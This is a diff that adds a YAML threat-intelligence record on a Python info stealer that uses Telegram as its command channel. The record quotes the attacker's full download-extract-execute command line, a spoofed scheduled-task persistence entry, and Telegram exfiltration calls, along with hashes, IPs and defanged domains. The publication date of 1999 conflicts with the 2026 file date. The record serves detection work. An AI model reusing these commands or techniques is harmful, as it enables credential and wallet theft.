@@ -1,0 +1,66 @@
+description: Vietnamese Stealer is a Python-based info stealer using Telegram as a
+  C2, targeting browser credentials, cookies, and cryptocurrency wallets.
+attribution: Vietnamese threat actors (@Byte_ManzZz, @panpan7986)
+malware_families:
+- Vietnamese Stealer
+TTPs:
+  processes:
+  - cmd.exe
+  - curl.exe
+  - svchost.exe
+  - conhost.exe
+  commandline:
+  - cmd /c cd &&start Document.pdf && curl -s -o Invoice.pdf http://mongky68[.]godohosting[.]com/detail/nonlocal/23summer/Invoice.pdf &&" .jpg" x -ibck -y -pAoG0mRrhQDZ9rxIFfJo02euJnDiftg6A Invoice.pdf C:\\Users\\Public &&del /s /q Invoice.pdf && del /s /q " .jpg" && del /s /q "  - DA .pdf" && cd
+    C:\\Users\\Public\\Windows &&conhost.exe --headless -- C:\\Users\\Public\\Windows\\svchost.exe DLLs\\py.ico MRB_2_NEW_VER_BOT &&exit
+  powershell:
+  - 'dir C:\\Users\\Public\\Windows\\Mode Name---- ----d----- DLLsd----- Lib-a---- svchost.exe # 106 KB'
+  - 'dir DLLs\\-a---- py.ico # 15.6 KB'
+  scripting_engine:
+  - Python
+  registry_keys: []
+  image_load:
+  - py.ico
+  network_connections:
+  - curl https://t[.]me/MRB_2_NEW_VER_BOT
+  - https://urlvanish[.]com/fe44f1ba -> mongky68[.]godohosting[.]com/.../PA
+  - GET ipwho.is/?output=json
+  - POST api.telegram.org/bot.../sendDocument
+  file_activity:
+  - C:\\Users\\Public\\Windows\\svchost.exe
+  - C:\\Users\\Public\\Windows\\DLLs\\py.ico
+  - Documents and Evidence Proving a Violation.zip
+  persistence:
+  - 'Task Name: MicrosoftEdgeUpdateTaskMachine, Author: Microsoft Corporation (spoofed),
+    Triggers: At logon + Daily every 1 hour, Start Date: 1999-01-01T00:00:00, Command:
+    conhost.exe --headless -- svchost.exe py.ico MRB_2_NEW_VER_BOT'
+  process_relations:
+  - cmd.exe -> curl.exe
+  - svchost.exe -> py.ico
+IOCs:
+  hashes:
+  - 1539dab6099d860add8330bf2a008a4b6dc05c71f7b4439aebf431e034e5b6ff
+  - c8a365c042ced6d445718e3534ec08455c2df42840b5a595d75a27204be52c24
+  - b23b5618bfc34110a02920578a9739923eef06b192066f8d7bd3965a07eefe0e
+  - 94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954
+  - d45c795dd777c538d7beb08ec9caa68a6a2eeabc75fb030f30b32ef4c3959a0d
+  - 536b910405fb7edb3ba2d632a629d646819d45a8a6381031afb1f1fa56cfd472
+  ip_addresses:
+  - 149.154[.]166.110
+  - 112.214.46[.]109
+  - 115.71.15[.]170
+  domains:
+  - t.me
+  - urlvanish[.]com
+  - mongky68[.]godohosting[.]com
+  - api.telegram.org
+  urls:
+  - https://t[.]me/MRB_2_NEW_VER_BOT
+  - https://urlvanish[.]com/fe44f1ba
+  - GET ipwho.is/?output=json
+  - POST api.telegram.org/bot.../sendDocument
+CVEs: '[]'
+authors:
+- Ron Benisty
+reference: https://profero.io/blog/dit-me-may-morphisec-when-malware-authors-taunt-security-researchers
+date_of_publication: January 01, 1999
+file_creation_date: March 04, 2026
